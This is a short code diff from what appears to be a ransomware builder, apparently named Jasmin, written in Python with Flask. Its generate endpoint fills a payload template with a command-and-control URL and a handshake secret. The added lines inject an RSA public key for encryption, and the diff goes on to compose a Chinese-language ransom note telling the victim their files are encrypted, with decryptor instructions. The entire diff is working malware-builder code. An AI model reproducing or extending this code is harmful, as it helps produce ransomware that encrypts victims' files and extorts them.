@@ -196,6 +196,12 @@ def generate():
     if not os.path.exists(tpl_path):
         return jsonify(ok=False, msg='模板文件缺失')
     tpl = open(tpl_path).read().replace('{{C2_URL}}',c2).replace('{{HANDSHAKE}}',sec)
+    # 注入RSA公钥
+    pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
+    if os.path.exists(pub_path):
+        tpl = tpl.replace('{{RSA_PUBLIC_KEY}}', open(pub_path).read().strip())
+    else:
+        return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
     # 构建勒索信
     dec = '运行 Jasmin_Decryptor.exe → 选择.pem私钥' if plat=='win' else 'pip3 install cryptography && python3 jasmin_decrypt.py key.pem'
     note = f"╔══════════════════════════════════════════╗\n║  {ransom['title']}\n║  你的文件已被加密\n╚══════════════════════════════════════════╝\n\n系统ID: {{sid}}\n\n{ransom['body']}\n"
